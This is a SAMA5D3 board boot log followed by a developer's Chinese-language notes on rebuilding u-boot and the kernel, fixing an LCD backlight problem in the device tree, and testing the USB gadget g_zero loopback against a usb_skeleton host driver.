pid_max: default: 32768 minimum: 301
Mount-cache hash table entries: 512
CPU: Testing write buffer coherency: ok
Setting up static identity map for 0xc0408878 - 0xc04088d0
devtmpfs: initialized
pinctrl core: initialized pinctrl subsystem
NET: Registered protocol family 16
DMA: preallocated 256 KiB pool for atomic coherent allocations
No ATAGs?
AT91: Power Management
gpio-at91 fffff200.gpio: at address fefff200
gpio-at91 fffff400.gpio: at address fefff400
gpio-at91 fffff600.gpio: at address fefff600
gpio-at91 fffff800.gpio: at address fefff800
gpio-at91 fffffa00.gpio: at address fefffa00
pinctrl-at91 pinctrl.2: initialized AT91 pinctrl driver
bio: create slab <bio-0> at 0
at_hdmac ffffe600.dma-controller: Atmel AHB DMA Controller ( cpy slave ), 8 channels
at_hdmac ffffe800.dma-controller: Atmel AHB DMA Controller ( cpy slave ), 8 channels
SCSI subsystem initialized
usbcore: registered new interface driver usbfs
usbcore: registered new interface driver hub
usbcore: registered new device driver usb
at91_i2c f0018000.i2c: using dma0chan0 (tx) and dma0chan1 (rx) for DMA transfers
at91_i2c f0018000.i2c: AT91 i2c bus driver.
Linux video capture interface: v2.00
Advanced Linux Sound Architecture Driver Initialized.
cfg80211: Calling CRDA to update world regulatory domain
Switching to clocksource tcb_clksrc
NET: Registered protocol family 2
TCP established hash table entries: 4096 (order: 3, 32768 bytes)
TCP bind hash table entries: 4096 (order: 2, 16384 bytes)
TCP: Hash tables configured (established 4096 bind 4096)
TCP: reno registered
UDP hash table entries: 256 (order: 0, 4096 bytes)
UDP-Lite hash table entries: 256 (order: 0, 4096 bytes)
NET: Registered protocol family 1
RPC: Registered named UNIX socket transport module.
RPC: Registered udp transport module.
RPC: Registered tcp transport module.
RPC: Registered tcp NFSv4.1 backchannel transport module.
msgmni has been set to 1003
io scheduler noop registered (default)
f0020000.serial: ttyS2 at MMIO 0xf0020000 (irq = 23) is a ATMEL_SERIAL
ffffee00.serial: ttyS0 at MMIO 0xffffee00 (irq = 36) is a ATMEL_SERIAL
console [ttyS0] enabled
brd: module loaded
loop: module loaded
ssc f0008000.ssc: Atmel SSC device at 0xe0858000 (irq 19)
atmel_nand_nfc 70000000.nfc: NFC is probed.
atmel_nand: Use On Flash BBT
atmel_nand 60000000.nand: Using dma0chan2 for DMA transfers.
ONFI param page 0 valid
ONFI flash detected
NAND device: Manufacturer ID: 0x2c, Chip ID: 0xda (Micron MT29F2G08ABAEAWP), 256MiB, page size: 2048, OOB size: 64
atmel_nand 60000000.nand: ONFI params, minimum required ECC: 4 bits in 512 bytes
atmel_nand 60000000.nand: Initialize PMECC params, cap: 4, sector: 512
atmel_nand 60000000.nand: Using NFC Sram read and write
Bad block table found at page 131008, version 0x01
Bad block table found at page 130944, version 0x01
2 cmdlinepart partitions found on MTD device atmel_nand
Creating 2 MTD partitions on "atmel_nand":
0x000000000000-0x000000800000 : "bootstrap/uboot/kernel"
0x000000800000-0x000010000000 : "rootfs"
atmel_spi f0004000.spi: version: 0x213
atmel_spi f0004000.spi: Using dma0chan3 (tx) and dma0chan4 (rx) for DMA transfers
atmel_spi f0004000.spi: Atmel SPI Controller at 0xf0004000 (irq 18)
atmel_spi f0004000.spi: master is unqueued, this is deprecated
m25p80 spi32766.0: unrecognized JEDEC id ffffff
CAN device driver interface
at91_can f000c000.can: device registered (reg_base=e0888000, irq=20)
at91_can f8010000.can: device registered (reg_base=e088a000, irq=27)
macb f0028000.ethernet (unregistered net_device): invalid hw address, using random
libphy: MACB_mii_bus: probed
macb f0028000.ethernet eth0: Cadence GEM at 0xf0028000 irq 24 (96:d9:d4:60:5a:46)
macb f0028000.ethernet eth0: attached PHY driver [Micrel KSZ9021 Gigabit PHY] (mii_bus:phy_addr=f0028000.etherne:01, irq=-1)
macb f802c000.ethernet (unregistered net_device): invalid hw address, using random
libphy: MACB_mii_bus: probed
macb f802c000.ethernet eth1: Cadence MACB at 0xf802c000 irq 30 (2a:b2:33:8e:32:a4)
macb f802c000.ethernet eth1: attached PHY driver [Micrel KSZ8031] (mii_bus:phy_addr=f802c000.etherne:00, irq=-1)
ehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver
ehci-atmel: EHCI Atmel driver
atmel-ehci 700000.ehci: EHCI Host Controller
atmel-ehci 700000.ehci: new USB bus registered, assigned bus number 1
atmel-ehci 700000.ehci: irq 44, io mem 0x00700000
atmel-ehci 700000.ehci: USB 2.0 started, EHCI 1.00
usb usb1: New USB device found, idVendor=1d6b, idProduct=0002
usb usb1: New USB device strings: Mfr=3, Product=2, SerialNumber=1
usb usb1: Product: EHCI Host Controller
usb usb1: Manufacturer: Linux 3.10.0-00354-gdf700c9 ehci_hcd
usb usb1: SerialNumber: 700000.ehci
hub 1-0:1.0: USB hub found
hub 1-0:1.0: 3 ports detected
ohci_hcd: USB 1.1 'Open' Host Controller (OHCI) Driver
at91_ohci 600000.ohci: AT91 OHCI
at91_ohci 600000.ohci: new USB bus registered, assigned bus number 2
at91_ohci 600000.ohci: irq 44, io mem 0x00600000
usb usb2: New USB device found, idVendor=1d6b, idProduct=0001
usb usb2: New USB device strings: Mfr=3, Product=2, SerialNumber=1
usb usb2: Product: AT91 OHCI
usb usb2: Manufacturer: Linux 3.10.0-00354-gdf700c9 ohci_hcd
usb usb2: SerialNumber: at91
hub 2-0:1.0: USB hub found
hub 2-0:1.0: 3 ports detected
usbcore: registered new interface driver cdc_acm
cdc_acm: USB Abstract Control Model driver for USB modems and ISDN adapters
usbcore: registered new interface driver usb-storage
usbcore: registered new interface driver usbserial
usbcore: registered new interface driver usbserial_generic
usbserial: USB Serial support registered for generic
usbcore: registered new interface driver ftdi_sio
usbserial: USB Serial support registered for FTDI USB Serial Device
usbcore: registered new interface driver pl2303
usbserial: USB Serial support registered for pl2303
atmel_usba_udc 500000.gadget: MMIO registers at 0xf8030000 mapped at e0898000
atmel_usba_udc 500000.gadget: FIFO at 0x00500000 mapped at e2400000
at91_rtc fffffeb0.rtc: rtc core: registered fffffeb0.rtc as rtc0
at91_rtc fffffeb0.rtc: AT91 Real Time Clock driver.
i2c /dev entries driver
soc-camera-pdrv soc-camera-pdrv.0: Probing soc-camera-pdrv.0
ov2640 1-0030: Product ID error 87:87
soc-camera-pdrv soc-camera-pdrv.1: Probing soc-camera-pdrv.1
ov5642 1-003c: reg_write: i2c write error, reg: 3103
ov5642: probe of 1-003c failed with error -121
leds-gpio leds.3: pins are not configured from the driver
atmel_aes f8038000.aes: version: 0x135
atmel_aes f8038000.aes: Atmel AES - Using dma1chan0, dma1chan1 for DMA transfers
atmel_tdes f803c000.tdes: version: 0x701
atmel_tdes f803c000.tdes: using dma1chan2, dma1chan3 for DMA transfers
atmel_tdes f803c000.tdes: Atmel DES/TDES
atmel_sha f8034000.sha: version: 0x410
atmel_sha f8034000.sha: using dma1chan4 for DMA transfers
atmel_sha f8034000.sha: Atmel SHA1/SHA256/SHA224/SHA384/SHA512
usbcore: registered new interface driver usbhid
usbhid: USB HID core driver
iio iio:device0: Resolution used: 12 bits
iio iio:device0: ADC Touch screen is disabled.
wm8904 1-001a: revision A
atmel-wm8904-audio sound.4: setting pck0 to 32768Hz
atmel-wm8904-audio sound.4:  wm8904-hifi <-> f0008000.ssc mapping ok
TCP: cubic registered
NET: Registered protocol family 10
sit: IPv6 over IPv4 tunneling driver
NET: Registered protocol family 17
can: controller area network core (rev 20120528 abi 9)
NET: Registered protocol family 29
can: raw protocol (rev 20120528)
can: broadcast manager protocol (rev 20120528 t)
can: netlink gateway (rev 20130117) max_hops=1
VFP support v0.3: implementor 41 architecture 2 part 30 variant 5 rev 1
UBI: attaching mtd1 to ubi0
UBI: scanning is finished
UBI: attached mtd1 (name "rootfs", size 248 MiB) to ubi0
UBI: PEB size: 131072 bytes (128 KiB), LEB size: 126976 bytes
UBI: min./max. I/O unit sizes: 2048/2048, sub-page size 2048
UBI: VID header offset: 2048 (aligned 2048), data offset: 4096
UBI: good PEBs: 1980, bad PEBs: 4, corrupted PEBs: 0
UBI: user volume: 1, internal volumes: 1, max. volumes count: 128
UBI: max/mean erase counter: 2/0, WL threshold: 4096, image sequence number: 107862926
UBI: available PEBs: 0, total reserved PEBs: 1980, PEBs reserved for bad PEB handling: 36
UBI: background thread "ubi_bgt0d" started, PID 552
input: gpio_keys.5 as /devices/gpio_keys.5/input/input0
at91_rtc fffffeb0.rtc: setting system clock to 2007-01-01 04:36:35 UTC (1167626195)
atmel_mci f0000000.mmc: version: 0x505
atmel_mci f0000000.mmc: using dma0chan7 for DMA transfers
atmel_mci f0000000.mmc: Atmel MCI controller at 0xf0000000 irq 17, 1 slots
atmel_mci f8000000.mmc: version: 0x505
atmel_mci f8000000.mmc: using dma1chan5 for DMA transfers
atmel_mci f8000000.mmc: Atmel MCI controller at 0xf8000000 irq 26, 1 slots
ALSA device list:
  #0: wm8904 @ SAMA5D3EK
UBIFS: background thread "ubifs_bgt0_0" started, PID 565
UBIFS: recovery needed
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 1189, bit_pos: 3, 0x0f -> 0x07
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 862, bit_pos: 3, 0x58 -> 0x50
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 1803, bit_pos: 2, 0x14 -> 0x10
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 1149, bit_pos: 7, 0xfe -> 0x7e
UBIFS: recovery completed
UBIFS: mounted UBI device 0, volume 0, name "rootfs"(null)
UBIFS: LEB size: 126976 bytes (124 KiB), min./max. I/O unit sizes: 2048 bytes/2048 bytes
UBIFS: FS size: 244936704 bytes (233 MiB, 1929 LEBs), journal size 9023488 bytes (8 MiB, 72 LEBs)
UBIFS: reserved for root: 0 bytes (0 KiB)
UBIFS: media format: w4/r0 (latest is w4/r0), UUID 061589C3-4114-491C-8ABD-5A0531BE13BA, small LPT model
VFS: Mounted root (ubifs filesystem) on device 0:11.
devtmpfs: mounted
Freeing unused kernel memory: 164K (c0564000 - c058d000)
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 51, bit_pos: 1, 0x06 -> 0x04
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 51, bit_pos: 1, 0x06 -> 0x04
Starting logging: OK
Populating /dev using udev: atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 963, bit_pos: 0, 0x03 -> 0x02
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 963, bit_pos: 0, 0x03 -> 0x02
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 963, bit_pos: 0, 0x03 -> 0x02
udevd[580]: starting version 182
done
Starting portmap: done
Initializing random number generator... done.
ALSA: Restoring mixer settings...
Starting network...
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 1836, bit_pos: 2, 0x04 -> 0x00
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 1324, bit_pos: 2, 0x0c -> 0x08
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 1836, bit_pos: 2, 0x04 -> 0x00
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 1836, bit_pos: 2, 0x04 -> 0x00
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 1665, bit_pos: 0, 0x5b -> 0x5a
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 1836, bit_pos: 2, 0x04 -> 0x00
Starting sshd: atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 165, bit_pos: 0, 0x0d -> 0x0c
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 1875, bit_pos: 0, 0x17 -> 0x16
OK

Welcome to Buildroot
buildroot login: atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 1149, bit_pos: 7, 0xfe -> 0x7e
atmel_nand 60000000.nand: Bit flip in data area, byte_pos: 1149, bit_pos: 7, 0xfe -> 0x7e
root

官方demo烧录发现并没有lcd的初始化！！
还有debug串口是J14的usb口
烧录非常方便：接上USB-a, 先按cs_boot不放，然后按reset，然后再松开cs_boot 然后就可以使用sam-ba烧录了

demo使用的 是uImage镜像，并非zImage,显然这里的uboot也并不合适，所以需要重新编译uboot！！
先重现编译bootstrap：
	make sama5d3_xplainednf_uboot_defconfig
	make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf-
重新编译uboot：
	git checkout origin/u-boot-2016.03-at91 -b u-boot-2016.03-at91	//选择分支
	make sama5d3_xplained_nandflash_defconfig
	make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf-
然后编译kernel：
	观察到由于预装的demo是使用uImage的，所以，我们也假设使用uImage
	先把uboot的 mkimage 工具，放到 /usr/bin
	make ARCH=arm sama5_defconfig
	make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- uImage LOADADDR=0x20008000 -j8
	撒后烧录时，注意要同时替换 dtb 和uImage，不然uImage对应不是同款内核编译出来的dtb时，启动会失败
以上都成功通过，
开始移植lcd！！！
注意，make ARCH=arm sama5_defconfig 后可不用 make ARCH=arm menuconfig 就已经绑入了lcd驱动
但是要配置dts，让lcd的驱动真正挂上系统，
测试过程中，lcd驱动有初始化，但就是没有得到 /dev/fb0
	原来是 dts没有做很好的配置，后来发现lcd的内容写在 sama5d3_lcd.dtsi，sama5d3xdm.dtsi
	所以只要sama535ek.dts里include上述两个文件就行！！
	但是，卡在ubi初始化之前！！
	经过跟踪实际上是，lcd初始化出问题了？？
	主要是背光灯处出现问题： 在dts里关于这个选项
	regulator-name = "backlight-power-supply"; 注释掉的话，系统流畅运行，但是fb0初始化失败，
		而使用这配置时，系统卡在初始化，跳不过去，具体卡在哪个点还不知道！！
		原来是 backlight 初始化出问题了！！！，在dts里取消掉backlight 的项的初始化就可以用！！！
		具体是， 注释掉panel panel：的 backlight = <&backlight>;
		blacklight：blacklight status = "disabled";
		然后就可以初始化出 fb0 了，关于 hlcdc 的dts 又有深的了解！！！
/ {
	ahb {
		apb {
			hlcdc: hlcdc@f0030000 {
				compatible = "atmel,sama5d3-hlcdc";
				reg = <0xf0030000 0x2000>;
				interrupts = <36 IRQ_TYPE_LEVEL_HIGH 0>;
				clocks = <&lcdc_clk>, <&lcdck>, <&clk32k>;
				clock-names = "periph_clk","sys_clk", "slow_clk";
				/* status = "disabled"; */
				status = "okay";

				hlcdc-display-controller {
					compatible = "atmel,hlcdc-display-controller";
					#address-cells = <1>;
					#size-cells = <0>;

					pinctrl-names = "default";
					pinctrl-0 = <&pinctrl_lcd_base &pinctrl_lcd_rgb888_alt>;

					port@0 {
						#address-cells = <1>;
						#size-cells = <0>;
						reg = <0>;

						hlcdc_panel_output: endpoint@0 {
							reg = <0>;
							remote-endpoint = <&panel_input>;
						};
					};
				};

				hlcdc_pwm: hlcdc-pwm {
					compatible = "atmel,hlcdc-pwm";
					pinctrl-names = "default";
					pinctrl-0 = <&pinctrl_lcd_pwm>;
					#pwm-cells = <3>;
				};
			};

			pinctrl@fffff200 {
				lcd {
					。。。。。。
					pinctrl_lcd_pwm: lcd-pwm-0 {
						atmel,pins = <AT91_PIOA 24 AT91_PERIPH_A AT91_PINCTRL_NONE>;	/* LCDPWM */
					};
					。。。。。。
				};
			};

		};
	};

	backlight: backlight {
		compatible = "pwm-backlight";
		pwms = <&hlcdc_pwm 0 50000 0>;
		brightness-levels = <0 4 8 16 32 64 128 255>;
		default-brightness-level = <6>;
		power-supply = <&bl_reg>;
		/* status = "okay"; */
		status = "disabled";
	};

	bl_reg: backlight_regulator {
		compatible = "regulator-fixed";
		regulator-name = "backlight-power-supply";
		regulator-min-microvolt = <5000000>;
		regulator-max-microvolt = <5000000>;
		status = "okay";
		/* status = "disabled"; */
	};

	panel: panel {
		compatible = "foxlink,fl500wvr00-a0t", "simple-panel";
		/* backlight = <&backlight>; */
		power-supply = <&panel_reg>;
		#address-cells = <1>;
		#size-cells = <0>;
		status = "okay";

		port@0 {
			#address-cells = <1>;
			#size-cells = <0>;

			panel_input: endpoint@0 {
				reg = <0>;
				remote-endpoint = <&hlcdc_panel_output>;
			};
		};
	};

	panel_reg: panel_regulator {
		compatible = "regulator-fixed";
		regulator-name = "panel-power-supply";
		regulator-min-microvolt = <3300000>;
		regulator-max-microvolt = <3300000>;
		status = "okay";
		/* status = "disabled"; */
	};
};
观察上述节dts： 
	hlcdc 两个节点  hlcdc-display-controller（lcd控制器）  hlcdc_pwm（lcd背光灯控制）
	lcd初始化时，会初始化 hlcdc-display-controller 里的所有内容，包括远程节点 panel_input: endpoint@0的内容，
	而初始化远程节点 panel_input: endpoint@0的内容，前提要先初始化 panel: panel 父节点的内容，
	panel: panel 父节点的内容，包括 backlight: backlight panel_reg: panel_regulator
	而 backlight: backlight 又绕回去 初始化 与hlcdc-display-controller 同级同属节点 hlcdc_pwm 的内容，
	当所有的这些都完成了，hlcdc-display-controller 才真正完成初始化，出现fb0！！
	简单流程图：
	hlcdc-display-controller（start） -> &panel_input -> panel: panel -> &backlight
		-> &hlcdc_pwm(hlcdc_pwm: hlcdc-pwm) -> &panel_reg
		-> hlcdc-display-controller（end）得fb0，
	也就是说 hlcdc_pwm: hlcdc-pwm 本来是另一个同级同属模块来着，但是现在情况是要求先初始化好了，hlcdc-display-controller才算初始好
	注意 由于循序初始化节点，所以 hlcdc: hlcdc 初始化好了，后米娜还会重复初始化 backlight: backlight一遍，不过检测到之前已初始化，所以作罢
	而现在是发现初始化 backlight: backlight 有问题，所以，我们选择初始化 hlcdc-display-controller 期间，不会初始化 backlight: backlight
		所以，我们 注释掉 backlight = <&backlight>; 这项，于是，成功初始化 hlcdc-display-controller
		但是，由于循序初始化节点，所以 hlcdc: hlcdc 初始化好了，后米娜还会重复初始化 backlight: backlight一遍，
		而发现初始化 backlight: backlight 有问题的，所以即使现在 hlcdc-display-controller 已经成功初始化，
		但是内核还是卡死在初始化backlight: backlight上
		所以，我们要把 backlight: backlight 配置 status = "disabled";
		然后，就完美初始化内核和 fb0 了！！！
然而没有背光的lcd 是无法显示的，所以此刻我们要调查背光初始化失败的原因，首先怀疑是 hlcdc-pwm 针被复用了！！！

还有补充`不知道是不是忘记了的知识 发现zImage是位置无关码！！ 放在0x20008000 或 0x22000000 的位置运行都行
还有，为方便调试，在内核的Makefile添加 自动拷贝镜像到指定路径的选项：
	在arch/arm/Makefile：
dtbs: prepare scripts
	$(Q)$(MAKE) $(build)=$(boot)/dts
# by william
	cp $(boot)/dts/sama5d35ek.dtb /home/infortech-ubuntu-1404/SAMA5D35/demo/DemoV1.1/
	在arch/arm/boot/Makefile：
$(obj)/zImage:	$(obj)/compressed/vmlinux FORCE
	$(call if_changed,objcopy)
	@$(kecho) '  Kernel: $@ is ready'
# by william
	cp $(obj)/zImage /home/infortech-ubuntu-1404/SAMA5D35/demo/DemoV1.1/












20170407
关于内核，之后几个重点学习驱动系统：
Periodic Interval Timer (PIT)
Power Management Controller (PMC)
Static Memory Controller (SMC)
DMA Controller (DMAC)
USB High Speed Device Port (UDPHS)
USB Host High Speed Port (UHPHS)
Gigabit Ethernet MAC (GMAC)
Ethernet 10/100 MAC (EMAC)
High Speed Multimedia Card Interface (HSMCI)
Synchronous Serial Controller (SSC)

先分析 usb 系统
usb从设备的系统构成
	最底层 udc 驱动（usb device control ）：atmel_usba_udc.c 底层驱动一般厂商做好，自己并不需要处理
	usb从设备的上层驱动（也就是 对应的gadget驱动）了：usb串口，u盘，usb网卡 （负责具体从设备功能内容）
		而这些上层驱动，都通过访问同一个底层驱动实现功能，底层驱动提供给上层驱动的接口
		但是 某一刻只允许 其中只允许一个上层驱动 访问 底层驱动，如果要使用另一个上层驱动，需要把现在的上层驱动注销
		方便上层驱动的开发，上层驱动一般都使用一个统一的 usb上层驱动架构 composite
为了更快理解composite框架的上层驱动的系统 分析，zero.c的内容，这是最简单的 usb上层驱动！！并尝试移植实现

分析 并 实现 zero.c
使用 sama5d35 板子 和 kernel1 的内核进行测试！
通过测试 g_zero 的功能 来 学习开发 usb从设备的上层驱动
为了测试 g_zero pc端也要加载相关的 usb用户驱动 来 实现访问 usb从设备，而我们修改usb_skeleton驱动来作为这个驱动
而 usb_skeleton 就是我们平常说的 usb设备驱动

usb_skeleton 作为 pc端 的模块 （/test/usb_skeleton_and_g_zero）
通过 makefile 生成 usb_skeleton.ko
	make之前,修改usb_skeleton.c 对应宏 与 zero.c里对应的宏一致便于usb识别,
	需要将USB_SKEL_VENDOR_ID 改成 0x0525，USB_SKEL_PRODUCT_ID改成0xa4a0 //注意usb_skeleton 与 g_zero 模块使用相同的 id 不然出错
	注意,make一定要添加 KERNEL_DIR 参数,而且参数指向 pc端的源码库/usr/src/linux-headers-3.19.0-25-generic 	//不然make会出错

编译 g_zero.ko
注意:使用kernel1 执行测试,menuconfig 添加 <M> Gadget Zero  然后重新编译内核
g_zero 是 composize 架构的 gadgst驱动(usb从设备上层),
看源码发现 zero.只是初始化的内容,而真正的功能操作是在另外的c文件上,观察编译log证明这假设:
  CC [M]  drivers/usb/gadget/legacy/zero.o
  CC [M]  drivers/usb/gadget/function/f_loopback.o
  CC [M]  drivers/usb/gadget/function/f_sourcesink.o
  LD [M]  drivers/usb/gadget/legacy/g_zero.o
  LD [M]  drivers/usb/gadget/function/usb_f_ss_lb.o
  Building modules, stage 2.
  Kernel: arch/arm/boot/Image is ready
  Kernel: arch/arm/boot/zImage is ready
  MODPOST 41 modules
  CC      drivers/usb/gadget/function/usb_f_ss_lb.mod.o
  CC      drivers/usb/gadget/legacy/g_zero.mod.o
  LD [M]  drivers/usb/gadget/function/usb_f_ss_lb.ko
  LD [M]  drivers/usb/gadget/legacy/g_zero.ko
估计,要实现完整的 g_zero 需要加载 usb_f_ss_lb.ko 和 g_zero.ko 两个模块

进行测试：
	pc端:
		sudo insmod usb-skeleton.ko	//加载usb-skeleton
		这时:[3747318.188823] usbcore: registered new interface driver skeleton
		但是 /dev 未出现 skel0
	开发板:
		insmod atmel_usba_udc.ko	//底层 udc驱动
		insmod libcomposite.ko		//应用于从设备上层驱动 的composite 框架
		insmod usb_f_ss_lb.ko		//g_zero 的 sourcesink and loopback 具体功能模块
		insmod g_zero.ko  loopdefault=1	//g_zero 的注册函数, 默认使用 loopback 配置
	使用usb线连接 usba 与 pc 
		dmesg_log:
		[3751198.626811] usb 1-11: new high-speed USB device number 16 using xhci_hcd
		[3751198.756060] usb 1-11: New USB device found, idVendor=0525, idProduct=a4a0
		[3751198.756064] usb 1-11: New USB device strings: Mfr=1, Product=2, SerialNumber=3
		[3751198.756066] usb 1-11: Product: Gadget Zero
		[3751198.756068] usb 1-11: Manufacturer: Linux 4.1.0-linux4sam_5.3 with atmel_usba_udc
		[3751198.756069] usb 1-11: SerialNumber: 0123456789.0123456789.0123456789
		[3751198.761383] skeleton 1-11:2.0: USB Skeleton device now attached to USBSkel-0
		这时/dev 也出现 skel0 设备点
	注意 pc端 连接 开发板前 先添加usbtest黑名单，不然出现以下log：
		[3741856.946750] usb 1-11: new high-speed USB device number 10 using xhci_hcd
		[3741857.075341] usb 1-11: New USB device found, idVendor=0525, idProduct=a4a0
		[3741857.075345] usb 1-11: New USB device strings: Mfr=1, Product=2, SerialNumber=3
		[3741857.075348] usb 1-11: Product: Gadget Zero
		[3741857.075350] usb 1-11: Manufacturer: Linux 4.1.0-linux4sam_5.3 with atmel_usba_udc
		[3741857.075351] usb 1-11: SerialNumber: 0123456789.0123456789.0123456789
		[3741857.146253] usbtest 1-11:3.0: Linux gadget zero
		[3741857.146257] usbtest 1-11:3.0: high-speed {control in/out bulk-in bulk-out} tests (+alt)	
			//这条以及以上的都发现和分析接入的usb从设备
		[3741857.146270] usbcore: registered new interface driver usbtest	
			//貌似是主机(host)端关于这个usb从设备的主机部分的驱动  
		pc检测完usb后会自动加载usbtest 这个host端的驱动模块和我们要加载的skeleton冲突，所以需要去掉 usbtest.ko, 
		由于在现版本ubuntu,usbtest.ko融入到内核,而不是以模块存在,所以不能 rmmod usbtest 就杜绝日后不会自动加载
		最好的做法是加入黑名单: 
			sudo echo 'blacklist usbtest' >> /etc/modprobe.d/blacklist.conf		//出错!!
			原来不是/etc/..的权限问题,而是sudo 与 echo 的问题:
			因为重定向符号 “>” 和 ">>" 也是 bash 的命令。我们使用 sudo 只是让 echo 命令具有了 root 权限，
			但是没有让 “>” 和 ">>" 命令也具有 root 权限
			方法1:
			echo 'blacklist usbtest' | sudo tee -a /etc/modprobe.d/blacklist.conf
			方法2:
			sudo gedit /etc/modprobe.d/blacklist.conf 然后在最后一行添加 blacklist usbtest
	在pc的terminal上执行测试:
		echo 'helloworld' | sudo tee -a /dev/skel0	//相当于给从设备输入信息
		cat /dev/skel0		//由于默认 loopback 配置,所以g_zero 得到信息后会返回给pc的skeleton,所以应该显示 helloworld 	
	问题:
		基本实现
		但是:cat /dev/skel0 并没有得到预期效果,但是显示大量关于开发板的信息,未知问题根结
通过以上分析：
如果我们要开发一个usb从设备的驱动，其实开发的从设备的上层驱动，是 gadget驱动，是建立在composite架构上的驱动！！
例如 g_zero这个gadget驱动 除去composite框架外，由 usb_f_ss_lb.ko 和 g_zero.ko 组成
由f_loopback.c f_sourcesink.c zero.c共同组成！！

补充：
Peripheral ID 同时也作为 硬件中断号！！









20170412
今天分析 g_zero 的功能实现，
知道 g_zero 由zero.c 和 f_loopback.c 组成，现在挖掘loopback功能
loopback_complete() //这里只把内容递给指定端点ep的传送队列，而底层udc才把ep的队列的内容传送给pc端
		    //同时这里实现了 loopback 的具体操作，把in端点的内容放入out端点队列，把out端点
处理 cat /dev/skel0 无穷消息输出的问题！！
目前知道是 enable_endpoint 的 usb_ep_queue 开始往ep队列输送信息，当信息真正被udc送到pc端后，
就会促发并从loopback_cpmplete()继续usb_ep_queue 往ep队列输送信息
终于弄清楚问题所在：由于 loopback_complete() 存在的代码bug引起！！！（linux-at91-master 这个源码包出现的bug）
	在usb从设备上层驱动上，out-ep（out端点） 指的是 从pc机即host端 往usb从设备输入数据的端点 
			      in-ep（in端点） 指的是 usb从设备 往pc机输出数据的端点
	所以，in 和 out 是以 pc机（host端）为正参照物的，不是以 usb从设备端
	当pc机和开发板都挂好对应的驱动，并用usb线连接好后：
		pc端建立了 skel0 设备节点
		由于 kernel1 的 g_zero模块的代码不完整，loopback功能已经提交了一些杂乱的数据到 in-ep上
		而提交到in-ep的数据会组合打包！！组合打包指，数据会按先后顺序打包
			而且，大数据的request会被分开多个包
			小数据的request会组合成多个包
	然后我们 cat /dev/skel0 时， pc端和开发板端的底层驱动才开始工作，把 in-ep端点队列上的内容传递到 pc机上，终端看到数据
	这时才算完成了数据的传输，然后每个完成传输的request（注意是每个request，不是每个组合打包后的数据包）会触发loopback_complete
	loopback_comple用于对完成了的request的处理，
	而这里出现的bug是，把这个在in-ep完成了的 request 由重新放回 in-ep 队列
	而不是清空请求，所以造成了源源不断的相同消息重新输出！！！
修改：
	对 in-ep 完成了的请求，官方建议应该放入 out-ep 的队列，（会清空内容然后，留下来等待收集输入数据么？）
	对 out-ep 完成了的请求， 是把这个从pc端获得内容的请求重新放入 in-ep 队列，静待时机重新传回到 pc端
	关键源码：
	int			status = req->status;

	switch (status) {
	case 0:				/* normal completion? */
		if (ep == loop->out_ep) {
			req->zero = (req->actual < req->length);
			req->length = req->actual;
			ep = loop->in_ep;

			//by william  when ep == loop->out_ep
			DBG(cdev, "receive message!! \n");
		}
		else {
			ep = loop->out_ep;

			//by william  when ep == loop->in_ep
			DBG(cdev, "send message!! \n");
		}
		status = usb_ep_queue(ep, req, GFP_ATOMIC);
		if (status == 0)
			return;
这样。在pc终端： echo “ helloworld ” >> /dev/skel0 输入内容到开发板
		cat /dev/skel0 读取开发板输出到pc端的内容
关于usb数据传输还有很多奇怪的内容未通透
		例如 关于收取数据的 request 会发送数据的request 的产生，使用和注销等等
		还有 host端的发送数据的request 的内容长度 与 开发板 收取数据的 request 的内容长度不一样的冲突等等！！！
		这些都后续讨论

g_zero重点处理了，下一步，分析usb_skeleton 的结构框架！！！
一般我们讨论的 usb驱动 是 pc端（host端）用来访问usb从设备的接口工具，为了仿混淆，我们称为 host端usb驱动
挂载在 host端usb驱动 和 挂载在 usb从设备的上层驱动 的架构是不一样的，
usb从设备的上层驱动 是基于 composite 架构的，媒介一般是 端点的 request
而 host端usb驱动 并不是基于composite 架构的，媒介一般是 urb








20170413
分析 usb_skeleton 这个 host端usb驱动
1，usb_skeleton模块挂入的函数是，module_usb_driver(skel_driver);然而模块挂入，并没有真正的模块功能挂载到linux上
   只是注册了一些信息到 usb_core 上
2，当 usb 接上 设备，会识别 id.table,匹配好，就执行skel_probe ，然后才是初始化设备等一系列工作，并建立访问的设备节点 /dev/skel0
3，设备操作集：写函数：
   写入/dev/skel0 的一段内容，会先根据内容多少而分别存入多个 user_buffer
   对每个user_buffer都会执行一次skel_write，传递内容
   skel_write 流程：
	检测 /dev/skel0是不是已经被其他操作占用，不是则继续操作
	检测 /dev/skel0是否有错误在身，不是则继续
	分配一个urb 分配一个dma_bufer空间，把user_buffer数据放入
	检测，连接是否断开，不是则继续 （当usb线断开，系统自动执行 skel_disconnect）
	把 dma_buffer 装入urb usb_fill_bulk_urb（把dma_buffer地址加载到urb）
	关联 anchor锚点 和 urb ，方便跟踪urb 不知如何去跟踪使用！具体操作是list_add_tail(&urb->anchor_list, &anchor->urb_list);
	提交urb 
	最后就可以释放urb（注意，提交urb是把整个urb包“复制”到usb_core,所以提交后，这时的urb就没有用了又占大量空间，所以要释放掉）
			（更加注意的是，并不会等usb_core执行了这次提交的urb后，才释放，而是提交了就释放）
   skel_write_bulk_callback:
	当usb_core执行了提交的urb后，就会触发中断执行这个函数
	释放我们在skel_write 分配的dma_buffer 空间
	然而并不没有释放这个被复制到usb_core的urb，可能在skel_write_bulk_callback之外释放吧。
4，设备操作集：读函数：
